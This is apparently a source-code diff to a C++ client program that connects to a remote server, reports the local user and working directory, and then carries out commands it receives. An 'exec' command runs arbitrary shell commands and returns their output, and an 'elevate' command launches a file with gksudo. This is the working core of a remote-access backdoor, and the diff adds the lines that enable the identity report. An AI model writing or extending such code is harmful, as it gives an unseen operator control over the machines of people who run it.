@@ -96,11 +96,12 @@ int main(int argc, char *argv[])
 
     freeaddrinfo(servinfo);
 
-/*    send(sockfd, "Connected!\n", 11, 0);
     std::string user = exec("whoami");
     std::string loc = exec("pwd");
-    user = user+" at "+loc+"\n";
-    send(sockfd, user.c_str(), user.size(), 0); */
+    user[user.size()-1] = '\0';
+    loc[loc.size()-1] = '\0';
+    user = user+" at "+loc;
+    send(sockfd, user.c_str(), user.size(), 0);
 
     while (true) {
         if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
@@ -131,18 +132,23 @@ int main(int argc, char *argv[])
                 close(sockfd);
                 return 0;
             } else if (!strcmp(command, "exec")) {
+                std::cout << buf << '\n';
                 std::string cmd = "";
                 for (int i = 5; buf[i] != '\0'; ++i) {
                     cmd += buf[i];
                 }
                 std::string out = exec(cmd.c_str());
+                if (out == "")
+                  out = "Command returned no output\n";
                 send(sockfd, out.c_str(), out.size(), 0);
             } else if (!strcmp(command, "elevate")) {
                 close(sockfd);
                 std::string cmd;
                 for (int i = 8; buf[i] != '\0'; ++i)
                     cmd += buf[i];
+                close(sockfd);
                 cmd = "gksudo ./"+cmd;
+                std::cout << cmd;
                 exec(cmd.c_str());
                 return 0;
             } else if (!strcmp(command, "hack")) {
